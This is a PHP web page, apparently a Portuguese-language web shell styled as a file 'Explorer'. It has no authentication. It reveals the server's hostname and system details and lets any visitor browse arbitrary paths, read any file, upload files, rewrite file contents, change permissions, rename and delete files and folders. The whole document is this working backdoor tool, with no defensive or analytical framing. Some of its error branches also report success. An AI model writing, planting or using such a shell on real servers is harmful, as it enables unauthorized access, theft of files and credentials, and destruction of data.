<!DOCTYPE HTML>
	<html lang="pt-br">
	<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
	<style type="text/css">
		body {
			font-family: Georgia, "Times New Roman", Times, serif;
			background-color:#CCC /*black*/;
			background-repeat: no-repeat;
			background-size: wrap_content;
			background-position: center;
			}
		#content tr:hover{
			background-color: 6y;
			text-shadow:0px 0px 10px #000000;
			}
		#content .first{
			color: #000000;
			background-image:url(#);
			}
		#content .first:hover{
			background-color: grey;
			text-shadow:0px 0px 1px #339900;
			}
		table, th, td {
				border-collapse:collapse;
				padding: 5px;
				color: #333 ;
				}
		.table_home, .th_home, .td_home { 
				color: #333;
				border: 2px solid grey;
				padding: 7px;
				}
		a{
			font-size: 16px;
			color: #000;
			text-decoration: none;
		}
		a:hover{
			color: white;
			text-shadow:0px 0px 10px #fff;
		}
		input,select,textarea{
			border: 1px #ffffff solid;
			-moz-border-radius: 5px;
			-webkit-border-radius:5px;
			border-radius:5px;
		}
		.close {
			overflow: auto;
			border: 1px solid #333 ;
			background: #333 ;
			color: white;
		}
		.r {
			float: right;
			text-align: right;
		}
		
		img {
			position: relative;
			left: -4px;
		
		}
		
		.name {
			font-family: Georgia, "Times New Roman", Times, serif;
			/*position: relative;*/
			font-size: 60px;
			top: -120px;
			color: white;
			text-shadow: 0px 0px 29px #333  , 0px 0px 10px #333 ;
		}
		
		.reserve {
			 font-family: Georgia, "Times New Roman", Times, serif;
			 font-size: 20px;
			 color: white;
			 text-shadow: 0px 0px 29px #333  , 0px 0px 10px #333 ;
		}
	</style>
	<body>
		<center>
			<font class="name">E x p l o r e r</font>
				<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
					<tr>
                    	<td>
							<?php
                            echo "
                            <tr>
                                <td>
                                    <font color='white'>
                            			<i class='fa fa-user'></i> 
								<td>
								: <font color='#333 '>".$_SERVER['REMOTE_ADDR']."
							<tr>
								<td>
									<font color='white'>
                            			<i class='fa fa-desktop'></i> 
								<td>
								: <font color='#333 '>".gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']."
							<tr>
								<td>
									<font color='white'>
                            			<i class='fa fa-hdd-o'></i> <td>: <font color='#333 '>".php_uname()."
                                	</font>
								</td>
                    		</tr>
						</td>
					</tr>
				</table>";

				echo '
				<table width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
					<tr align="left">
						<td align="left"><br>';
							if(isset($_GET['path'])){
								$path = $_GET['path'];
							} else {
								$path = getcwd();
							}
							$path = str_replace('\\','/',$path);
							$paths = explode('/',$path);
							
							foreach($paths as $id=>$pat){
							if($pat == '' && $id == 0){
								$a = true;
								echo '<i class="fa fa-folder-o"></i> : <a href="?path=/">/</a>';
								continue;
							}
							if($pat == '') 
								continue;
								echo '<a href="?path=';
								for($i=0;$i<=$id;$i++){
									echo "$paths[$i]";
									if($i != $id) echo "/";
								}
								echo '">'.$pat.'</a>/';
							}
							//upload de arquivos
							echo '
							<br><!--<br><br>-->
							<form enctype="multipart/form-data" method="POST">
								<font color="#333 ">
									Upload de arquivo: 
									<input type="file" name="file" style="color:#333 ;border:2px solid #333 ;" required/>
								</font>
								<input type="submit" value="Enviar" style="margin-top:4px;width:100px;height:27px;font-family:Georgia, "Times New Roman", Times, serif;font-size:15;background:#0069d9;color: #fff ;border:2px solid #fff ;border-radius:5px"/>';
								if(isset($_FILES['file'])){
									if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
										echo '<br><br><font color="#333 ">Arquivo enviado com sucesso!!!!</font><br/><br>';
									} else {
										echo '<script>alert("Erro ao enviar o arquivo...")</script>';
									}
								}

							echo '
							</form>
						</td>
					</tr>';
					if(isset($_GET['filesrc'])){
						echo "
						<tr>
							<td>
								Arquivos >> ";
								echo $_GET['filesrc'];
							echo '
							</td>
						</tr>
				</table>
				<br />';
				echo(' 
					<textarea  style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1200px;" readonly> '
						.htmlspecialchars(file_get_contents($_GET['filesrc'])).'
					</textarea>');
					} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete'){
						echo '
				</table>
				<br />
				<center>'.$_POST['path'].'<br /><br />';

				//Permissões
				if($_POST['opt'] == 'chmod'){
					if(isset($_POST['perm'])){
						if(chmod($_POST['path'],$_POST['perm'])){
							echo '<br><br><font color="#333 ">Permissões alteradas com sucesso!!!</font><br/><br>';
						} else {
							echo '<script>alert("Permissões não foram alteradas...")</script>';
						}
					}
					echo '
					<form method="POST">
						Permissão : 
						<input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="width:80px; height: 30px;"/>
						<input type="hidden" name="path" value="'.$_POST['path'].'">
						<input type="hidden" name="opt" value="chmod">
						<input type="submit" value="Done" style="width:60px; height: 30px;"/>
					</form>';
				}
				//Renomeando pasta
				elseif($_GET['opt'] == 'btw'){
					$cwd = getcwd();
					 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
				New Name : <input name="name" type="text" size="25" value="Folder" style="width:300px; height: 30px;"/>
				<input type="hidden" name="path" value="'.$cwd.'">
				<input type="hidden" name="opt" value="delete">
				<input type="submit" value="Go" style="width:100px; height: 30px;"/>
				</form>';
				}
				//Renomeando arquivo
				elseif($_POST['opt'] == 'rename'){
					if(isset($_POST['newname'])){
						if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
							echo '<br><br><font color="#333 ">Nome alterado com sucesso!!!</font><br/><br>';
						} else {
						echo '<script>alert("Name Change SUCCESS !!")</script>';
					}
					$_POST['name'] = $_POST['newname'];
				}
				echo '
				<form method="POST">
					New Name : 
					<input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
					<input type="hidden" name="path" value="'.$_POST['path'].'">
					<input type="hidden" name="opt" value="rename">
					<input type="submit" value="Done" style="height:30px;" />
				</form>';
			}
			//Editando pasta
			elseif($_POST['opt'] == 'edit'){
				if(isset($_POST['src'])){
					$fp = fopen($_POST['path'],'w');
					if(fwrite($fp,$_POST['src'])){
						echo '<br><br><font color="#333 ">Arquivo editado com sucesso!!!</font><br/><br>';
					} else {
						echo '<script>alert("Arquivo editado com sucesso!!!")</script>';	
				}
				fclose($fp);
			}
			echo '
			<form method="POST">
				<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
				<input type="hidden" name="path" value="'.$_POST['path'].'">
				<input type="hidden" name="opt" value="edit">
				<input type="submit" value="Done" style="height:30px; width:70px;"/>
			</form>';
		}
		echo '</center>';
	} else {
		echo '</table><br /><center>';
		//Deletando diretório
		if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
			if($_POST['type'] == 'dir'){
				if(rmdir($_POST['path'])){
					echo '<br><br><font color="#333 ">Diretório deletado com sucesso!!!</font><br/><br>';
				} else {
					echo '<script>alert("Delete Dir Success !!")</script>>';
				}
			}
			//Deletando arquivo
			elseif($_POST['type'] == 'file'){
				if(unlink($_POST['path'])){
					echo '<br><br><font color="#333 ">Arquivo deletado com sucesso!!!</font><br/><br>';
				} else {
					echo '<script>alert("Arquivo deletado com sucesso!!!")</script>';
				}
			}
		}

		?>
		<?php
	echo 
	'</center>';
	$scandir = scandir($path);
	$pa = getcwd();
	echo '
	<div id="content">
		<table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr class="first">
				<th><center>Nome</center></th>
				<th><center>|</center></th>
				<th><center>Permissão</center></th>
				<th><center>Opções</center></th>
			</tr>
			<tr>';
				foreach($scandir as $dir){
					if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
		echo "
			<tr>
				<td class=td_home>
					<i style='color:#ffe897' class='fa fa-folder-o'></i>
					<a href=\"?path=$path/$dir\"> $dir</a>
				</td>
				<td class=td_home><center>DIR</center></td>
				<td class=td_home>
					<center>";
						if(is_writable("$path/$dir")) echo '<font color="#333">';
						elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
					
						echo perms("$path/$dir");
						if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

					echo "
					</center>
				</td>
				<td class=td_home>
					<center>
						<form method=\"POST\" action=\"?option&path=$path\">
							<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Georgia, 'Times New Roman', Times, serif;font-size:15;background:#fff;color:#333 ;border:2px solid #333 ;border-radius:5px\">
						  		<option value=\"Action\">Ações</option>
						  		<option value=\"delete\">Deletar</option>
						  		<option value=\"chmod\">Permissões</option>
						  		<option value=\"rename\">Renomear</option>
						  	</select>
							<input type=\"hidden\" name=\"type\" value=\"dir\">
							<input type=\"hidden\" name=\"name\" value=\"$dir\">
							<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
							<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Georgia, 'Times New Roman', Times, serif;font-size:15;background:#0069d9;color:#fff ;border:2px solid #fff ;border-radius:5px\"/>
						</form>
					</center>
				</td>
			</tr>";
		}

		echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
		foreach($scandir as $file){
			if(!is_file("$path/$file")) continue;
			$size = filesize("$path/$file")/1024;
			$size = round($size,3);
			if($size >= 1024){
				$size = round($size/1024,2).' MB';
			} else {
			$size = $size.' KB';
		}

		echo "
		<tr>
			<td class=td_home><i class='fa fa-file-o'></i>
				<a href=\"?filesrc=$path/$file&path=$path\"> $file</a>
			</td>
			<td class=td_home>
				<center>".$size."</center>
			</td>
			<td class=td_home>
				<center>";
					if(is_writable("$path/$file")) echo '<font color="#333">';
					elseif(!is_readable("$path/$file")) echo '<font color="#FF0004">';
					echo perms("$path/$file");
					if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

				echo "
				</center>
			</td>
			<td class=td_home>
				<center>
					<form method=\"POST\" action=\"?option&path=$path\">
						<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Georgia, 'Times New Roman', Times, serif;font-size:15;background:#fff;color:#333 ;border:2px solid #333 ;border-radius:5px\">
						<option value=\"Action\">Ações</option>
						<option value=\"delete\">Deletar</option>
						<option value=\"edit\">Editar</option>
						<option value=\"rename\">Renomear</option>
						<option value=\"chmod\">Permissões</option>
					</select>
					<input type=\"hidden\" name=\"type\" value=\"file\">
					<input type=\"hidden\" name=\"name\" value=\"$file\">
					<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
					<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Georgia, 'Times New Roman', Times, serif;font-size:15;background:#0069d9;color:#fff ;border:2px solid #fff ;border-radius:5px\"/>
					</form>
				</center>
			</td>
		</tr>";
	}
	echo '
	</table>
</div>';
}

function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
		// Linhk symbolic
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
		// Bloco special
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
		// Diretório
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
		// Characters speciais
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} else {
		// Desconhecido
		$info = 'u';
	}

	// Proprietário
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}
?>
<br><br>
</body>
</html>